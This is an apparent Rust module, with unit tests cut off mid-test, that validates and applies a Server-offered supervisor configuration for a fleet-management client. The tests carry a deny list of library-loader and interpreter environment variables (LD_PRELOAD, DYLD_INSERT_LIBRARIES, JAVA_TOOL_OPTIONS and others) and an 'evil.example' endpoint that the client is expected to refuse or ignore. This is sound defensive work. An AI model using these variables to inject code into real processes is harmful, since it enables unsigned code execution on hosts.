//! The Supervisor-set apply (ADR-0017): what the Client does with a remote configuration offered
//! to its **own** Agent.
//!
//! Only the `[[supervisor]]` blocks of the offered document are read — every other top-level key
//! is ignored, because the rest of `supervisor.toml` is host-local trust and wiring the Server must
//! never write. The offered set is validated against the running configuration's globals first;
//! then the Supervisors that left or changed are stopped, the merged document is written to
//! `supervisor.toml` — surgically, so the operator's comments and layout survive — the removed
//! Supervisors' directories are purged (ADR-0017), and the changed and added Supervisors are
//! started from the file just written. Unchanged Supervisors ride through untouched.

use std::path::Path;

use opamp::proto::{AgentRemoteConfig, AgentToServer};
use tracing::{info, instrument, warn, Instrument as _};

use crate::config::{redact_secrets, ClientConfig, SupervisorBlock};
use crate::engine::Engine;
use crate::shutdown::Shutdown;

/// Applies an offered Supervisor set end to end and closes the self-Agent's `APPLYING` →
/// `APPLIED`/`FAILED` lifecycle. Returns the goodbyes of the retired Agents, for the transport
/// to send — the Baseline's `agent_disconnect` is the last message each of them says.
///
/// A failure before anything is stopped (parse, validation, a Client running without a
/// configuration path) applies nothing: the offer is reported `FAILED` and the running set stays
/// in force.
#[instrument(
    name = "config.apply",
    skip_all,
    fields(
        hash = %hex::encode(&offer.config_hash),
        otel.status_code = tracing::field::Empty,
        otel.status_description = tracing::field::Empty,
    )
)]
pub async fn apply(
    engine: &mut Engine,
    config: &mut ClientConfig,
    offer: AgentRemoteConfig,
    shutdown: &Shutdown,
) -> Vec<AgentToServer> {
    let hash = offer.config_hash.clone();
    // The outcome the Server is told is the outcome the trace carries (ADR-0016), including the
    // distinction this module exists to keep: a refusal touched nothing, a failure did.
    let span = tracing::Span::current();
    match apply_inner(engine, config, &offer, shutdown).await {
        Ok(goodbyes) => {
            info!("supervisor set applied");
            crate::telemetry::succeeded(&span);
            engine.self_config_applied(hash, Ok(()));
            goodbyes
        }
        Err(Refused(error)) => {
            warn!(error = %error, "refusing the offered supervisor set");
            crate::telemetry::failed(&span, &error);
            engine.self_config_applied(hash, Err(error));
            Vec::new()
        }
        Err(Failed(error, goodbyes)) => {
            warn!(error = %error, "the offered supervisor set failed to apply");
            crate::telemetry::failed(&span, &error);
            engine.self_config_applied(hash, Err(error));
            goodbyes
        }
    }
}

use ApplyError::{Failed, Refused};

enum ApplyError {
    /// Nothing was touched: the running set stays in force.
    Refused(String),
    /// The apply began — Supervisors were stopped — and then failed; their goodbyes still have
    /// to go out.
    Failed(String, Vec<AgentToServer>),
}

async fn apply_inner(
    engine: &mut Engine,
    config: &mut ClientConfig,
    offer: &AgentRemoteConfig,
    shutdown: &Shutdown,
) -> Result<Vec<AgentToServer>, ApplyError> {
    let path = config
        .path
        .clone()
        .ok_or_else(|| Refused("this Client runs without a configuration file".to_string()))?;
    let validate = tracing::info_span!("validate").entered();
    let (blocks, tables) = offered_blocks(offer).map_err(Refused)?;

    // The merge is: local globals, offered Supervisors. Validate the offered blocks against the
    // running globals exactly as startup would read them — before any running process is touched.
    let mut candidate = config.clone();
    candidate.supervisors = blocks.clone();
    for block in &blocks {
        validate_offered_block(&candidate, block).map_err(Refused)?;
        // Against what runs now: the operator's `[supervisors]` and the running block of the
        // same name decide what a delivered block may bring (ADR-0017 clauses 38, 39).
        crate::supervisor::check_delivered_block(config, block).map_err(Refused)?;
    }
    // What will be written is rendered now, before anything stops, and must read back as exactly
    // the set just checked: what is checked is what is written (ADR-0017 clause 28).
    let rendered = render_supervisors(&path, tables)
        .and_then(|text| reads_back_as(&text, &blocks).map(|()| text))
        .map_err(Refused)?;
    drop(validate);

    let Plan {
        stopping,
        starting,
        removed,
    } = plan(&config.supervisors, &blocks);

    // A removed Supervisor is uninstalled (ADR-0017) — its adapter answers before the purge
    // below — while a changed one is only stopped and restarts under its name.
    let goodbyes = engine
        .retire_supervisors(&stopping, &removed)
        .instrument(tracing::info_span!(
            "stop",
            stopping = stopping.len(),
            removed = removed.len()
        ))
        .await;

    // Stopped, so the write comes next: a crash between the two restarts into the old file, one
    // after it into the new one — both build exactly what the file says, so both converge.
    let write = tracing::info_span!("write", path = %path.display()).entered();
    let source = match replace_file(&path, rendered) {
        Ok(source) => source,
        Err(e) => {
            // The old file still stands, so the old set is what this Client must run: bring the
            // stopped Supervisors back rather than leave them down with the file still naming
            // them.
            let error = format!("cannot write {}: {e}", path.display());
            restart_stopped(engine, config, &stopping, shutdown);
            return Err(Failed(error, goodbyes));
        }
    };

    // Written: the file no longer names the removed Supervisors, so their directories go with
    // them (ADR-0017) — program, packages, configuration, identity. The changed blocks in
    // `stopping` restart under their names and keep theirs.
    drop(write);
    {
        let _purge = tracing::info_span!("purge", removed = removed.len()).entered();
        purge_removed(config, &removed);
    }

    config.supervisors = blocks;
    let redacted = redact_secrets(&source);
    config.source = Some(redacted.clone());
    engine.set_self_effective_config(redacted);

    let mut errors = Vec::new();
    let _start = tracing::info_span!("start", starting = starting.len()).entered();
    for name in starting {
        let Some(block) = config.supervisors.iter().find(|block| block.name == name) else {
            continue;
        };
        if let Err(e) = start(engine, config, block, shutdown) {
            errors.push(e);
        }
    }
    if errors.is_empty() {
        Ok(goodbyes)
    } else {
        Err(Failed(errors.join("; "), goodbyes))
    }
}

/// What applying an offered set does to the running one (ADR-0017), by Supervisor name.
#[derive(Debug, PartialEq, Eq)]
struct Plan {
    /// Removed and changed: stopped before the file is written.
    stopping: Vec<String>,
    /// Changed and added: started from the written file.
    starting: Vec<String>,
    /// Absent **by name** from the offered set: their directories are purged. A changed block keeps
    /// its name and is stopped and restarted, not removed, so its directory rides through.
    removed: Vec<String>,
}

/// The apply is a diff, keyed by Supervisor name: removed and changed stop, changed and added
/// start, unchanged ride through — the point of managing the set from the Server.
fn plan(running: &[SupervisorBlock], offered: &[SupervisorBlock]) -> Plan {
    Plan {
        stopping: running
            .iter()
            .filter(|old| {
                offered
                    .iter()
                    .all(|new| new.name != old.name || new != *old)
            })
            .map(|old| old.name.clone())
            .collect(),
        starting: offered
            .iter()
            .filter(|new| running.iter().all(|old| old != *new))
            .map(|new| new.name.clone())
            .collect(),
        removed: running
            .iter()
            .filter(|old| offered.iter().all(|new| new.name != old.name))
            .map(|old| old.name.clone())
            .collect(),
    }
}

/// Deletes a removed Supervisor's directory whole — program, packages, configuration, and the
/// `instance-uid` whose Agent has already said its goodbye (ADR-0017). It does not touch
/// `<state_dir>/package-high-water.json` (ADR-0043 clause 14): whatever a re-added Supervisor
/// installs, under the same name or another, is held to the mark of its Agent type. Runs only after the
/// rewritten `supervisor.toml` no longer names the Supervisor: a failed write restarts the stopped
/// set from the old file, which needs the data intact. A directory that will not delete is a
/// warning, never a `FAILED` apply — the set the Server asked for is running; the leftover is an
/// orphan the next startup reports.
fn purge_removed(config: &ClientConfig, removed: &[String]) {
    // Resolved once, so the confinement check below compares canonical against canonical — which
    // catches a symlinked *parent* component as well as a symlinked directory. `None` if the root
    // does not exist yet, in which case there is nothing under it to purge either.
    let canon_root = config.supervisors_root().canonicalize().ok();
    for name in removed {
        let dir = config.supervisor_dir(name);
        // The delete is confined to the Supervisor's own directory *self-containedly* (ADR-0017),
        // not by trusting `remove_dir_all`'s symlink handling. `name` is already a validated single
        // component (ADR-0017), so `dir` cannot traverse; the risk this guards is a symlink planted
        // where the directory should be. Refuse to recurse through one — unlink the stray link
        // itself — and refuse a resolved path that is not under the supervisors root.
        match std::fs::symlink_metadata(&dir) {
            Ok(meta) if meta.file_type().is_symlink() => {
                let _ = std::fs::remove_file(&dir);
                warn!(supervisor = %name, path = %dir.display(), "refusing to purge through a symlink; removed the link only");
                continue;
            }
            Ok(_) => {
                if let (Some(root), Ok(resolved)) = (&canon_root, dir.canonicalize()) {
                    if !resolved.starts_with(root) {
                        warn!(supervisor = %name, path = %dir.display(), "refusing to purge: the resolved path is outside the supervisors directory");
                        continue;
                    }
                }
            }
            // Never materialized (a block that failed to start owns no directory yet): purged is
            // what it already is.
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => continue,
            Err(e) => {
                warn!(supervisor = %name, path = %dir.display(), error = %e, "cannot inspect the removed supervisor's directory");
                continue;
            }
        }
        match std::fs::remove_dir_all(&dir) {
            Ok(()) => {
                info!(supervisor = %name, path = %dir.display(), "removed supervisor purged");
            }
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => {}
            Err(e) => warn!(
                supervisor = %name,
                path = %dir.display(),
                error = %e,
                "cannot purge the removed supervisor's directory"
            ),
        }
    }
}

/// Brings the Supervisors a failed apply had stopped back up from the still-standing old
/// configuration. A Supervisor that will not start again is a log line — the apply already
/// failed, and its status carries the error that matters.
fn restart_stopped(
    engine: &mut Engine,
    config: &ClientConfig,
    stopped: &[String],
    shutdown: &Shutdown,
) {
    for block in config
        .supervisors
        .iter()
        .filter(|block| stopped.contains(&block.name))
    {
        if let Err(e) = start(engine, config, block, shutdown) {
            warn!(supervisor = %block.name, error = %e, "cannot restart after a failed apply");
        }
    }
}

/// Starts one Supervisor block as the Engine's next Agent.
fn start(
    engine: &mut Engine,
    config: &ClientConfig,
    block: &SupervisorBlock,
    shutdown: &Shutdown,
) -> Result<(), String> {
    let index = engine.next_index();
    // The marks the startup read, so a re-added Supervisor is held to its type's mark (ADR-0043
    // clause 14). An Engine built without them reads them from `state_dir` now.
    let marks = match engine.high_water() {
        Some(marks) => marks,
        None => {
            let marks: std::sync::Arc<dyn crate::supervisor::ports::HighWaterMarks> =
                std::sync::Arc::new(crate::storage::HighWaterFile::open(&config.state_dir));
            engine.set_high_water(marks.clone());
            marks
        }
    };
    let agent = crate::supervisor::start_supervisor(
        config,
        block,
        index,
        &engine.events_handle(),
        shutdown,
        &marks,
    )?;
    engine.add_supervisor(agent);
    Ok(())
}

/// Reads the offered Supervisor set out of the composed config map (ADR-0017): every entry is
/// parsed as TOML, the union of their `[[supervisor]]` blocks is the set, and every other
/// top-level key is ignored — the boundary is enforced by what the Client takes. Returns the
/// parsed blocks beside their verbatim tables, which is what the write puts into `supervisor.toml`
/// so the offered text survives as written.
///
/// # Errors
/// Returns an error for entry names no host can store as files of their own, an entry that is not
/// TOML, a `supervisor` key that is not an array of tables, a block the startup parser would
/// refuse, or a duplicate Supervisor name — a genuine ambiguity inside the accepted scope.
pub fn offered_blocks(
    offer: &AgentRemoteConfig,
) -> Result<(Vec<SupervisorBlock>, Vec<toml_edit::Table>), String> {
    let map = offer
        .config
        .as_ref()
        .map(|c| &c.config_map)
        .ok_or_else(|| "the offer carries no configuration".to_string())?;
    // The set is stored as entry files once it applied; an entry no host can store is refused now,
    // before anything stops.
    crate::storage::check_entry_names(offer)?;
    // Entries in name order: the composed map is unordered on the wire, and the written file
    // should not depend on iteration luck.
    let mut entries: Vec<(&String, &opamp::proto::AgentConfigObject)> = map.iter().collect();
    entries.sort_by_key(|(name, _)| name.as_str());

    let mut blocks = Vec::new();
    let mut tables = Vec::new();
    for (entry, file) in entries {
        let text = std::str::from_utf8(&file.body)
            .map_err(|_| format!("entry {entry:?} is not UTF-8 text"))?;
        // Parsed twice on purpose: serde carries the blocks through the same strict
        // `SupervisorBlock` parse the startup loader uses, and `toml_edit` carries their
        // verbatim text — comments included — into the rewritten file. Same parser family, same
        // text, so the two block lists align by position.
        let mut parsed: toml::Table =
            toml::from_str(text).map_err(|e| format!("entry {entry:?} is not TOML: {e}"))?;
        let doc: toml_edit::DocumentMut = text
            .parse()
            .map_err(|e| format!("entry {entry:?} is not TOML: {e}"))?;
        let Some(value) = parsed.remove("supervisor") else {
            // An entry without blocks contributes nothing — with every entry like this, the
            // offered set is empty and the apply stops every Supervisor.
            continue;
        };
        let toml::Value::Array(values) = value else {
            return Err(format!(
                "entry {entry:?}: `supervisor` must be an array of tables"
            ));
        };
        let verbatim = doc
            .get("supervisor")
            .and_then(supervisor_tables)
            .filter(|tables| tables.len() == values.len())
            .ok_or_else(|| format!("entry {entry:?}: `supervisor` must be an array of tables"))?;
        for (value, table) in values.into_iter().zip(verbatim) {
            let toml::Value::Table(raw) = value else {
                return Err(format!(
                    "entry {entry:?}: `supervisor` must be an array of tables"
                ));
            };
            let block =
                SupervisorBlock::try_from(raw).map_err(|e| format!("entry {entry:?}: {e}"))?;
            if blocks
                .iter()
                .any(|b: &SupervisorBlock| b.name == block.name)
            {
                return Err(format!(
                    "entry {entry:?}: duplicate supervisor name {:?}",
                    block.name
                ));
            }
            blocks.push(block);
            tables.push(table);
        }
    }
    Ok((blocks, tables))
}

/// Validates one offered `[[supervisor]]` block before any running process is touched: the startup
/// loader's own checks (block schema, program-path resolution, ports, timeouts — ADR-0017 point 28),
/// and then the delivery-path constraint of ADR-0017.
///
/// A Server-delivered block may name only a program **this Client owns** — a bare file name, whose
/// program lives in a directory this Client created and updates from signature-verified packages
/// (ADR-0017). Letting the Server spawn a program on the machine would be arbitrary code execution
/// that never passes through package signing.
///
/// That rule **cannot fire** (ADR-0017): no block naming a program on the machine parses at all,
/// from any principal, so every block reaching here already satisfies it. The check stays as
/// defence in depth against a future shape nobody has thought of yet — deleting a guard because it
/// currently cannot trigger is how it comes back — and `resolve_block_program` below is what
/// enforces it in fact.
fn validate_offered_block(config: &ClientConfig, block: &SupervisorBlock) -> Result<(), String> {
    crate::supervisor::validate_block(config, block)?;
    crate::supervisor::resolve_block_program(config, block)?;
    Ok(())
}

/// The `[[supervisor]]` blocks of one parsed entry, whichever TOML spelling carried them —
/// an array of tables, or an inline array of inline tables. `None` when the key is neither.
fn supervisor_tables(item: &toml_edit::Item) -> Option<Vec<toml_edit::Table>> {
    match item {
        toml_edit::Item::ArrayOfTables(tables) => Some(tables.iter().cloned().collect()),
        toml_edit::Item::Value(toml_edit::Value::Array(array)) => array
            .iter()
            .map(|value| match value {
                toml_edit::Value::InlineTable(inline) => Some(inline.clone().into_table()),
                _ => None,
            })
            .collect(),
        _ => None,
    }
}

/// Replaces the `[[supervisor]]` blocks of `supervisor.toml` with the offered ones and leaves every
/// other line of the file exactly as the operator wrote it — comments, ordering, formatting
/// (ADR-0017). A file that does not exist yet is created; the write goes through a sibling
/// temporary file so a crash never leaves a half-written configuration. Returns the new text.
#[cfg(test)]
fn write_supervisors(path: &Path, tables: Vec<toml_edit::Table>) -> Result<String, String> {
    replace_file(path, render_supervisors(path, tables)?)
}

/// The file with its `[[supervisor]]` array replaced by `tables`, everything else as it was.
///
/// Every delivered table keeps the position it had in its own entry, and `toml_edit` writes tables
/// in position order across the whole document — so tables from two entries would interleave, and
/// a sub-table such as `[supervisor.env]` would land under another block's header. Each table and
/// its sub-tables are therefore renumbered in array order, after everything the file already has.
fn render_supervisors(path: &Path, tables: Vec<toml_edit::Table>) -> Result<String, String> {
    let text = match std::fs::read_to_string(path) {
        Ok(text) => text,
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => String::new(),
        Err(e) => return Err(format!("cannot read the current file: {e}")),
    };
    let mut doc: toml_edit::DocumentMut = text
        .parse()
        .map_err(|e| format!("the current file is not TOML: {e}"))?;
    doc.remove("supervisor");
    if !tables.is_empty() {
        let mut next = last_position(doc.as_table()) + 1;
        let mut array = toml_edit::ArrayOfTables::new();
        for mut table in tables {
            renumber(&mut table, &mut next);
            array.push(table);
        }
        doc.insert("supervisor", toml_edit::Item::ArrayOfTables(array));
    }
    Ok(doc.to_string())
}

/// The highest position any table of `table` holds, itself included.
fn last_position(table: &toml_edit::Table) -> isize {
    let mut last = table.position().unwrap_or(0);
    for (_, item) in table.iter() {
        match item {
            toml_edit::Item::Table(inner) => last = last.max(last_position(inner)),
            toml_edit::Item::ArrayOfTables(array) => {
                for inner in array.iter() {
                    last = last.max(last_position(inner));
                }
            }
            _ => {}
        }
    }
    last
}

/// Gives `table` and every table below it the next positions, in order.
fn renumber(table: &mut toml_edit::Table, next: &mut isize) {
    table.set_position(Some(*next));
    *next += 1;
    for (_, item) in table.iter_mut() {
        match item {
            toml_edit::Item::Table(inner) => renumber(inner, next),
            toml_edit::Item::ArrayOfTables(array) => {
                for inner in array.iter_mut() {
                    renumber(inner, next);
                }
            }
            _ => {}
        }
    }
}

/// Whether the rendered file reads back as exactly the checked set.
fn reads_back_as(text: &str, blocks: &[SupervisorBlock]) -> Result<(), String> {
    let parsed: ClientConfig =
        toml::from_str(text).map_err(|e| format!("the rewritten file would not parse: {e}"))?;
    if parsed.supervisors != blocks {
        return Err(
            "the rewritten file would not read back as the offered set — nothing was changed"
                .to_string(),
        );
    }
    Ok(())
}

/// Replaces `path` with `new_text` in one step.
fn replace_file(path: &Path, new_text: String) -> Result<String, String> {
    let tmp = path.with_extension("toml.tmp");
    write_replacement(&tmp, path, &new_text)?;
    // `rename` replaces an existing file on every platform — on Windows it is `MoveFileExW` with
    // `MOVEFILE_REPLACE_EXISTING` — so there is never a moment without a file.
    std::fs::rename(&tmp, path).map_err(|e| format!("cannot replace the file: {e}"))?;
    Ok(new_text)
}

/// Writes the new configuration to the temporary file the caller then renames over `supervisor.toml`.
///
/// On Unix the temp file inherits the mode of the file it will replace — created with it, never
/// widened after — so the rename cannot loosen permissions. `supervisor.toml` may hold
/// `[packages] archive_key` in cleartext and is created `0600` (`config_init::write_new`); writing
/// the temp file at the default umask (`0644`) and renaming it over the original, as this did
/// before, left that secret world-readable after every Server-driven reconfigure (ADR-0017). A file that does not
/// exist yet falls back to `0600`, the same floor `write_new` uses. The operator's own mode, if
/// they widened or narrowed it deliberately, is preserved.
fn write_replacement(tmp: &Path, target: &Path, contents: &str) -> Result<(), String> {
    // Clear any temp left by a crashed earlier write, so the create below is fresh and its mode
    // actually takes effect (a mode is applied only when a file is created).
    let _ = std::fs::remove_file(tmp);
    let mut options = std::fs::OpenOptions::new();
    options.write(true).create_new(true);
    #[cfg(unix)]
    {
        use std::os::unix::fs::{OpenOptionsExt as _, PermissionsExt as _};
        let mode = std::fs::metadata(target)
            .map(|meta| meta.permissions().mode() & 0o777)
            .unwrap_or(0o600);
        options.mode(mode);
    }
    #[cfg(not(unix))]
    let _ = target;
    let mut file = options
        .open(tmp)
        .map_err(|e| format!("cannot write {}: {e}", tmp.display()))?;
    use std::io::Write as _;
    file.write_all(contents.as_bytes())
        .map_err(|e| format!("cannot write {}: {e}", tmp.display()))
}

#[cfg(test)]
mod tests {
    use super::*;
    use opamp::proto::{AgentConfigMap, AgentConfigObject};

    fn offer_of(entries: &[(&str, &str)]) -> AgentRemoteConfig {
        AgentRemoteConfig {
            config: Some(AgentConfigMap {
                config_map: entries
                    .iter()
                    .map(|(name, body)| {
                        (
                            (*name).to_string(),
                            AgentConfigObject {
                                body: body.as_bytes().to_vec(),
                                ..Default::default()
                            },
                        )
                    })
                    .collect(),
            }),
            config_hash: b"hash".to_vec(),
        }
    }

    /// ADR-0017 point 27: only the `[[supervisor]]` blocks are read; a full `supervisor.toml`-shaped
    /// document may be offered and exactly its fleet-manageable half takes effect.
    #[test]
    fn foreign_top_level_keys_are_ignored() {
        let offer = offer_of(&[(
            "fleet",
            r#"
            endpoint = "wss://evil.example/v1/opamp"
            state_dir = "/somewhere/else"

            [[supervisor]]
            type = "command"
            name = "agent"
            command = "agent"
            "#,
        )]);
        let (blocks, _) = offered_blocks(&offer).expect("parse");
        assert_eq!(blocks.len(), 1);
        assert_eq!(blocks[0].name, "agent");
    }

    /// A duplicate name is not a foreign key but a genuine ambiguity inside the accepted scope —
    /// within one entry or across two.
    #[test]
    fn duplicate_supervisor_names_fail_the_offer() {
        let block = "[[supervisor]]\ntype = \"command\"\nname = \"agent\"\ncommand = \"agent\"\n";
        let within = offer_of(&[("a", &format!("{block}{block}"))]);
        let err = offered_blocks(&within).expect_err("duplicate within an entry");
        assert!(err.contains("duplicate supervisor name"), "{err}");

        let across = offer_of(&[("a", block), ("b", block)]);
        let err = offered_blocks(&across).expect_err("duplicate across entries");
        assert!(err.contains("duplicate supervisor name"), "{err}");
    }

    /// The set is stored as entry files once it applied, so entry names no host could store are
    /// refused before anything stops, not found out after the set already runs.
    /// Verifies: ADR-0017
    #[test]
    fn an_offer_whose_entries_cannot_all_be_stored_is_refused() {
        let block = "[[supervisor]]\ntype = \"command\"\nname = \"agent\"\ncommand = \"agent\"\n";
        let err = offered_blocks(&offer_of(&[("nul", block)])).expect_err("a device name");
        assert!(err.contains("\"nul\""), "{err}");
        let err = offered_blocks(&offer_of(&[("Fleet", block), ("fleet", "")]))
            .expect_err("two entries, one file");
        assert!(
            err.contains("\"Fleet\"") && err.contains("\"fleet\""),
            "{err}"
        );
    }

    /// A block the startup parser would refuse is refused here, naming the entry — the same
    /// strictness ADR-0010 asks of the file.
    #[test]
    fn a_malformed_block_names_its_entry() {
        let offer = offer_of(&[(
            "bad",
            "[[supervisor]]\ntype = \"command\"\ncommand = \"x\"\n",
        )]);
        let err = offered_blocks(&offer).expect_err("a block without a name");
        assert!(err.contains("\"bad\""), "{err}");
        assert!(err.contains("needs a `name`"), "{err}");
    }

    /// The running configuration a delivered block is checked against: `globals` for the
    /// operator's `[supervisors]`, then the running blocks.
    fn running(globals: &str, blocks: &str) -> ClientConfig {
        let mut config: ClientConfig = toml::from_str(globals).expect("config");
        if !blocks.is_empty() {
            let (running, _) = offered_blocks(&offer_of(&[("running", blocks)])).expect("parse");
            config.supervisors = running;
        }
        config
    }

    fn delivered(block: &str) -> SupervisorBlock {
        let (blocks, _) = offered_blocks(&offer_of(&[("fleet", block)])).expect("parse");
        blocks.into_iter().next().expect("one block")
    }

    const AGENT: &str =
        "[[supervisor]]\ntype = \"command\"\nname = \"agent\"\ncommand = \"agent\"\n";

    /// Verifies: ADR-0017
    #[test]
    fn a_delivered_block_may_not_add_environment_the_operator_did_not_allow() {
        let block = delivered(&format!("{AGENT}env = {{ OTEL_RESOURCE = \"a\" }}\n"));
        let err = crate::supervisor::check_delivered_block(&running("", AGENT), &block)
            .expect_err("not allowed");
        assert!(
            err.contains("\"agent\"") && err.contains("OTEL_RESOURCE"),
            "{err}"
        );
        assert!(
            err.contains("delivered_env"),
            "names the way to allow it: {err}"
        );
        let allowing = running("[supervisors]\ndelivered_env = [\"OTEL_*\"]\n", AGENT);
        crate::supervisor::check_delivered_block(&allowing, &block).expect("allowed by prefix");
    }

    /// Verifies: ADR-0017
    #[test]
    fn a_loader_variable_is_refused_whatever_the_operator_allowed() {
        let allowing = running("[supervisors]\ndelivered_env = [\"*\"]\n", AGENT);
        for name in [
            "LD_PRELOAD",
            "LD_LIBRARY_PATH",
            "DYLD_INSERT_LIBRARIES",
            "PATH",
            "Path",
            "GLIBC_TUNABLES",
            "JAVA_TOOL_OPTIONS",
            "COR_PROFILER_PATH",
        ] {
            let block = delivered(&format!(
                "{AGENT}env = {{ {name} = \"${{config_dir}}/x.so\" }}\n"
            ));
            let err = crate::supervisor::check_delivered_block(&allowing, &block)
                .expect_err("a loader variable");
            assert!(err.contains(name), "{err}");
        }
    }

    /// An allowed name still may not point at a file the Server delivered into the Supervisor's
    /// own directories — the OpenTelemetry Java agent would load a jar from there.
    /// Verifies: ADR-0017
    #[test]
    fn a_delivered_value_may_not_point_into_its_own_directories() {
        let allowing = running("[supervisors]\ndelivered_env = [\"OTEL_*\"]\n", AGENT);
        for value in ["${config_dir}/x.jar", "${supervisor_dir}/program/x"] {
            let block = delivered(&format!(
                "{AGENT}env = {{ OTEL_JAVAAGENT_EXTENSIONS = \"{value}\" }}\n"
            ));
            let err = crate::supervisor::check_delivered_block(&allowing, &block).expect_err(value);
            assert!(err.contains("own directories"), "{err}");
        }
    }

    /// The interpreters' and shells' own loader variables are refused like the dynamic loader's,
    /// in any case, whatever the operator allowed and whatever the value.
    /// Verifies: ADR-0017
    #[test]
    fn an_interpreter_or_shell_loader_variable_is_refused_whatever_the_operator_allowed() {
        let allowing = running("[supervisors]\ndelivered_env = [\"*\"]\n", AGENT);
        for name in [
            "PERLLIB",
            "PERL5DB",
            "PYTHONHOME",
            "RUBYLIB",
            "NODE_PATH",
            "PATHEXT",
            "COMSPEC",
            "ComSpec",
            "node_path",
        ] {
            let block = delivered(&format!("{AGENT}env = {{ {name} = \"x\" }}\n"));
            let err = crate::supervisor::check_delivered_block(&allowing, &block)
                .expect_err("a loader variable");
            assert!(err.contains(name) && err.contains("steer"), "{err}");
        }
    }

    /// A value naming a path under the Supervisors' root is refused as the placeholders are: the
    /// Server delivers files there that no one signed. `delivered_env = ["*"]` itself stands, a
    /// value the running block already carries stands, and a sibling of the root is not under it.
    /// Verifies: ADR-0017
    #[test]
    fn a_delivered_value_may_not_name_a_path_under_the_supervisors_root() {
        let root = std::env::temp_dir().join("fleet-supervisors");
        let s = std::path::MAIN_SEPARATOR;
        let list = if cfg!(windows) { ';' } else { ':' };
        let globals = format!(
            "supervisor_dir = {:?}\n[supervisors]\ndelivered_env = [\"*\"]\n",
            root.display().to_string()
        );
        let allowing = running(&globals, AGENT);
        let r = root.display();
        for value in [
            format!("{r}{s}agent{s}config{s}x.jar"),
            format!("{r}"),
            format!("-javaagent:{r}{s}agent{s}config{s}x.jar"),
            format!("{s}opt{list}{r}{s}other{s}config"),
            format!("{r}{s}.{s}agent{s}{s}config{s}x"),
            format!("{r}{s}..{s}fleet-supervisors{s}agent{s}config{s}x"),
        ] {
            let block = delivered(&format!(
                "{AGENT}env = {{ OTEL_JAVAAGENT_EXTENSIONS = {value:?} }}\n"
            ));
            let err =
                crate::supervisor::check_delivered_block(&allowing, &block).expect_err(&value);
            assert!(err.contains("own directories"), "{value}: {err}");
        }
        for value in [format!("{r}-other{s}x"), "info".to_owned()] {
            let block = delivered(&format!("{AGENT}env = {{ OTEL_LOG_LEVEL = {value:?} }}\n"));
            crate::supervisor::check_delivered_block(&allowing, &block).expect(&value);
        }
        let kept = format!("{AGENT}env = {{ OTEL_X = {:?} }}\n", format!("{r}{s}x"));
        crate::supervisor::check_delivered_block(&running(&globals, &kept), &delivered(&kept))
            .expect("a value the running block carries");
    }

    /// Tables from two entries keep their sub-tables: what is written reads back as the set that
    /// was checked, and a `[supervisor.env]` never moves under another block's header.
    /// Verifies: ADR-0017
    #[test]
    fn delivered_tables_from_two_entries_keep_their_sub_tables() {
        let offer = offer_of(&[
            (
                "a",
                "[[supervisor]]\ntype = \"command\"\nname = \"a\"\ncommand = \"agent\"\n\n\
                 [supervisor.env]\nOTEL_X = \"1\"\n",
            ),
            (
                "b",
                "[[supervisor]]\ntype = \"command\"\nname = \"b\"\ncommand = \"agent\"\n",
            ),
        ]);
        let (blocks, tables) = offered_blocks(&offer).expect("parse");
        let dir = tempfile::tempdir().expect("tempdir");
        let path = dir.path().join("supervisor.toml");
        std::fs::write(&path, "endpoint = \"wss://fleet.example/v1/opamp\"\n").expect("write");
        let text = render_supervisors(&path, tables).expect("render");
        reads_back_as(&text, &blocks).expect("the checked set, block for block");
        let parsed: ClientConfig = toml::from_str(&text).expect("parse");
        assert!(parsed.supervisors[0].settings.contains_key("env"), "{text}");
        assert!(
            !parsed.supervisors[1].settings.contains_key("env"),
            "{text}"
        );
    }

    /// Verifies: ADR-0017
    #[test]
    fn a_delivered_block_keeps_the_environment_it_already_runs_with() {
        let operators = format!("{AGENT}env = {{ LD_LIBRARY_PATH = \"/opt/vendor/lib\" }}\n");
        let config = running("", &operators);
        crate::supervisor::check_delivered_block(&config, &delivered(&operators))
            .expect("what the operator wrote, delivered back unchanged");
        let changed = delivered(&format!("{AGENT}env = {{ LD_LIBRARY_PATH = \"/tmp\" }}\n"));
        assert!(crate::supervisor::check_delivered_block(&config, &changed).is_err());
    }

    /// Verifies: ADR-0017
    #[test]
    fn delivered_arguments_need_the_operators_consent() {
        let with_args = delivered(&format!(
            "{AGENT}args = [\"-c\", \"${{config_dir}}/conf\"]\n"
        ));
        let err = crate::supervisor::check_delivered_block(&running("", AGENT), &with_args)
            .expect_err("arguments without consent");
        assert!(err.contains("delivered_args"), "{err}");
        let version = delivered(&format!("{AGENT}version_args = [\"--version\"]\n"));
        assert!(crate::supervisor::check_delivered_block(&running("", AGENT), &version).is_err());
        let consenting = running("[supervisors]\ndelivered_args = true\n", AGENT);
        crate::supervisor::check_delivered_block(&consenting, &with_args).expect("consented");
        let same = format!("{AGENT}args = [\"-v\"]\n");
        crate::supervisor::check_delivered_block(&running("", &same), &delivered(&same))
            .expect("the running block's own arguments");
    }

    const LISTED_GLOBALS: &str = "[supervisors]\nremote_config_disabled = [\"agent\"]\n\
                                  delivered_args = true\ndelivered_env = [\"*\"]\n";

    /// With every argument and variable allowed, a listed Supervisor's delivered block still
    /// equals its running block whole: a changed `args`, `version_args`, `env` entry or core key,
    /// an added key and a dropped one are each refused naming the block and the key, and the
    /// running block delivered back passes (ADR-0017 clause 54).
    /// Verifies: ADR-0017
    #[test]
    fn a_delivered_block_for_a_listed_supervisor_must_equal_the_running_block_whole() {
        let body = "args = [\"-c\", \"/etc/agent.conf\"]\nversion_args = [\"-v\"]\n\
                    env = { OTEL_X = \"1\" }\n";
        let operators = format!("{AGENT}{body}");
        let config = running(LISTED_GLOBALS, &operators);
        crate::supervisor::check_delivered_block(&config, &delivered(&operators))
            .expect("the operator's own block, delivered back");
        for (key, changed) in [
            (
                "args",
                body.replace("\"/etc/agent.conf\"", "\"--config=yaml:receivers: {}\""),
            ),
            ("version_args", body.replace("\"-v\"", "\"-V\"")),
            ("env", body.replace("\"1\"", "\"2\"")),
            (
                "args",
                body.replace("args = [\"-c\", \"/etc/agent.conf\"]\n", ""),
            ),
            ("args", body.replace("[\"-c\", \"/etc/agent.conf\"]", "[]")),
            (
                "service_name",
                format!("{body}service_name = \"io.example.other\"\n"),
            ),
            (
                "stop_timeout_secs",
                format!("{body}stop_timeout_secs = 1\n"),
            ),
            (
                "program_path",
                format!("{body}program_path = \"bin/other\"\n"),
            ),
        ] {
            let block = delivered(&format!("{AGENT}{changed}"));
            let err = crate::supervisor::check_delivered_block(&config, &block).expect_err(key);
